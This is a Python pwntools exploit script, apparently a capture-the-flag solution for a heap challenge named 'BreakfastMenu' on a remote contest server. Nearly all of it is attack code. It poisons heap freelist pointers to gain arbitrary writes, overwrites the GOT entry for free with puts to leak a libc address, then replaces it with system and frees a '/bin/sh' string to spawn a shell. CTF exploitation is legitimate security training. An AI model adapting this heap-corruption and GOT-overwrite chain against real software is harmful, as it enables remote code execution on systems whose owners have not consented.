from pwn import *

exe = ELF("BreakfastMenu_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def log_print(*msg):
    log.info(" ".join(map(str,msg)))

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("breakfast.sdc.tf", 1337)
    return r


io = start()

# make one heap pointer point to obj.orders
io.sendlineafter(b"leave\n",b'1')
io.sendlineafter(b"leave\n",b'1')

io.sendlineafter(b"leave\n",b'3')
io.sendlineafter(b"remove\n",b'0')

io.sendlineafter(b"leave\n",b'3')
io.sendlineafter(b"remove\n",b'1')

print("got.free, got.puts",hex(exe.got["free"]))

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'1')
io.sendlineafter(b"order?\n",flat([exe.symbols["orders"]]))

io.sendlineafter(b"leave\n",b'1')
io.sendlineafter(b"leave\n",b'1')

# obj.orders[0] = exe.got["free"]

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'2')
io.sendlineafter(b"order?\n",b"/bin/sh\x00")

# obj.orders[0] = exe.got["free"]

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'3')
io.sendlineafter(b"order?\n",flat([exe.got["free"]]))

# exe.got["free"] = exe.sym["puts"]

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'0')
io.sendlineafter(b"order?\n",flat([b'AAAAA\x00']))

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'0')
io.sendlineafter(b"order?\n",flat([b'AAAA\x00']))

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'0')
io.sendlineafter(b"order?\n",flat([exe.sym["puts"]]))

# obj.orders[0] = exe.got["printf"]

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'3')
io.sendlineafter(b"order?\n",flat([exe.got["printf"]]))

# free(obj.orders[0]) => puts(obj.orders[0])

io.sendlineafter(b"leave\n",b'3')
io.sendlineafter(b"remove\n",b'0')
libc.address = int.from_bytes(io.recvuntil(b'\n1. ',drop=True),"little") - libc.sym["printf"]
print("libc leak",hex(libc.address))

# obj.orders[0] = exe.got["free"]

io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'3')
io.sendlineafter(b"order?\n",flat([exe.got["free"]]))

# exe.got["free"] = libc.sym["system"]
io.sendlineafter(b"leave\n",b'2')
io.sendlineafter(b"modify\n",b'0')
io.sendlineafter(b"order?\n",flat([libc.sym["system"]]))

# free(obj.orders[2]) => system("/bin/sh")

io.sendlineafter(b"leave\n",b'3')
io.sendlineafter(b"remove\n",b'2')
io.interactive()
